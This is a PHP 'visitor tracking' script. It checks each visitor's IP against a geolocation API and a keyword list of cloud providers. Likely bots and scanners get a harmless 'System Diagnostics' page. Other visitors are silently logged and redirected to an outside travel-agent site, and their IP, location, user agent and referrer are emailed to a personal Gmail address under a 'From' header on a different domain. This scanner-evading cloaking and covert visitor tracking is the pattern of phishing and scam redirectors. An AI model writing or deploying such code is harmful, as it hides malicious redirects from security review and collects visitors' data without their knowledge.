<?php
/**
 * Professional Visitor Tracking & Validation Script
 * Filters out Data Centers / Hosting Bots and handles authentic traffic cleanly.
 */

function getClientIp(): string
{
    $keys = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR',
    ];

    foreach ($keys as $key) {
        if (empty($_SERVER[$key])) {
            continue;
        }

        $ipList = explode(',', $_SERVER[$key]);
        $ip = trim($ipList[0]);

        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            return $ip;
        }
    }

    return 'Unknown';
}

function getIpDetails(string $ip): array
{
    $default = [
        'country' => 'Unknown',
        'city' => 'Unknown',
        'region' => 'Unknown',
        'is_datacenter' => false
    ];

    if ($ip === 'Unknown' || $ip === '127.0.0.1' || $ip === '::1') {
        return [
            'country' => 'Local',
            'city' => 'Localhost',
            'region' => 'Local',
            'is_datacenter' => false
        ];
    }

    // Call API with a 5-second timeout safeguard
    $url = 'https://ipapi.co/' . rawurlencode($ip) . '/json/';
    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'ignore_errors' => true,
            'header' => "User-Agent: LegalVisitorValidator/1.0\r\n"
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return $default;
    }

    $data = json_decode($response, true);
    if (!is_array($data)) {
        return $default;
    }

    // Identify Data Center / Hosting networks 
    $isDataCenter = false;
    
    // Check block type provided by advanced providers or check signature keywords
    $org = strtolower($data['org'] ?? '');
    $asn = strtolower($data['asn'] ?? '');
    
    $datacenterKeywords = [
        'digitalocean', 'amazon', 'aws', 'google cloud', 'linode', 
        'ovh', 'hetzner', 'microsoft', 'azure', 'leaseweb', 'vultr'
    ];

    foreach ($datacenterKeywords as $keyword) {
        if (strpos($org, $keyword) !== false || strpos($asn, $keyword) !== false) {
            $isDataCenter = true;
            break;
        }
    }

    return [
        'country' => $data['country_name'] ?? 'Unknown',
        'city' => $data['city'] ?? 'Unknown',
        'region' => $data['region'] ?? 'Unknown',
        'is_datacenter' => $isDataCenter
    ];
}

// Initialize core tracking metrics
$ipAddress = getClientIp();
$location = getIpDetails($ipAddress);

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct visit';
$timestamp = date('Y-m-d H:i:s');
$requestUri = $_SERVER['REQUEST_URI'] ?? '/';

// Core Business Logic Execution
if ($location['is_datacenter'] === false && $ipAddress !== 'Unknown') {
    
    // 1. Log Authentic Visitors Only
    $logFile = __DIR__ . '/visitor_log.txt';
    $logEntry = "[$timestamp] IP: $ipAddress | Country: {$location['country']} | City: {$location['city']} | Region: {$location['region']} | UA: $userAgent | Referrer: $referrer | URL: $requestUri\n";
    @file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

    // 2. Dispatch Email Alerts
    $sendEmail = true; 
    if ($sendEmail) {
        $to = 'drmagicakins@gmail.com';
        $subject = 'New Visitor Log Entry';
        $message = "A new authentic visitor has accessed your site:\n\n" . $logEntry;
        $headers = "From: no-reply@mcitng.com\r\n" .
                   "Reply-To: no-reply@mcitng.com\r\n" .
                   "X-Mailer: PHP/" . phpversion();

        @mail($to, $subject, $message, $headers);
    }

    // 3. Process Authentic User Travel Redirection
    $redirect = true; 
    $urlRedirect = 'https://www.tourtravelworld.com/travel-agents/nigeria/lagos-state-tour-operator.html'; 
    if ($redirect) {
        header("Location: $urlRedirect");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostics</title>
</head>
<body>
    <h1>Connection Properties</h1>
    <p><strong>IP Address:</strong> <?php echo htmlspecialchars($ipAddress, ENT_QUOTES, 'UTF-8'); ?></p>
    <p><strong>Country:</strong> <?php echo htmlspecialchars($location['country'], ENT_QUOTES, 'UTF-8'); ?></p>
    <p><strong>City:</strong> <?php echo htmlspecialchars($location['city'], ENT_QUOTES, 'UTF-8'); ?></p>
    <p><strong>Region:</strong> <?php echo htmlspecialchars($location['region'], ENT_QUOTES, 'UTF-8'); ?></p>
    <p><strong>Network Profile:</strong> <?php echo $location['is_datacenter'] ? 'Data Center / Script Bot (Actions Ignored)' : 'Authentic Residential/Mobile Connection'; ?></p>
    <p><strong>Browser Profile:</strong> <?php echo htmlspecialchars($userAgent, ENT_QUOTES, 'UTF-8'); ?></p>
    <p><strong>Referrer Path:</strong> <?php echo htmlspecialchars($referrer, ENT_QUOTES, 'UTF-8'); ?></p>
</body>
</html>